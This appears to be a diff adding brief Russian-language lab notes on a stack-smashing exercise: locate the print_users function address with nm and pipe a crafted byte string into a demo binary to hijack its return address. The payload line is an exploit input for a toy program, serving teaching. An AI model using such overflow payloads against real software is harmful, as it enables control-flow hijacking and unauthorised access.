@@ -1,0 +1,5 @@
+Находим адрес функции print_users (nm / objdump / gdb).
+
+ nm -A stack-smash | grep print_users
+
+echo -n -e "\x11\x40\x00\x99" | ./stack-smash
